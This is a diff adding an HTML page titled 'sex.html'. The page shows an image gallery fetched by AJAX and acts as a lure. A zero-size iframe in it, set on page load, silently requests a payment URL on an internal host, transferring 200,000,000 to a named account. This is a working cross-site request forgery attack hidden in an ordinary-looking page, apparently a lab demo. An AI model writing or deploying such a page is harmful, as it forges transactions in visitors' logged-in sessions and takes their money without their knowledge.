@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>sex.html</title>
+<meta name="keywords" content="keyword1,keyword2,keyword3">
+<meta name="description" content="this is my page">
+<meta name="content-type" content="text/html; charset=UTF-8">
+<script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
+<style>
+iframe {
+	width: 0px;
+	height: 0px;
+}
+
+img {
+	width: 200px;
+	height: 200px;
+}
+
+ul {
+	list-style-type: none;
+}
+
+ul li {
+	float: left;
+	margin-right: 10px;
+	margin-top: 10px;
+}
+</style>
+
+</head>
+
+<body>
+	<iframe></iframe>
+	<ul>
+	</ul>
+
+	<script type="text/javascript">
+		var iframe = document.getElementsByTagName("iframe")[0];
+		iframe.src = "http://192.168.1.31:8080/EasyPush/pay?account=ylf@zfb.com&bills=200000000";
+
+		var ul = document.getElementsByTagName("ul")[0];
+		for(var mon=1;mon<13;mon++){
+		  for(var dy=1;dy<30;dy++){
+		     getPic(mon, dy);
+		  }
+		}
+
+		function getPic(m,d) {
+			$.ajax({
+				type : "GET",
+				url : "gan",
+				data : {
+					month : m,
+					day : d
+				},
+				success : function(data) {
+					var obj = data.results;
+					for (var i = 0; i < obj.length; i++) {
+						var li = document.createElement("li");
+						var a = document.createElement("a");
+						var img = document.createElement("img");
+						img.src = obj[i].url;
+						a.appendChild(img);
+						li.appendChild(a);
+						ul.appendChild(li);
+					}
+				},
+				fail : function(e) {
+					console.log(e);
+				},
+				dataType : "json"
+			});
+		}
+	</script>
+</body>
+</html>
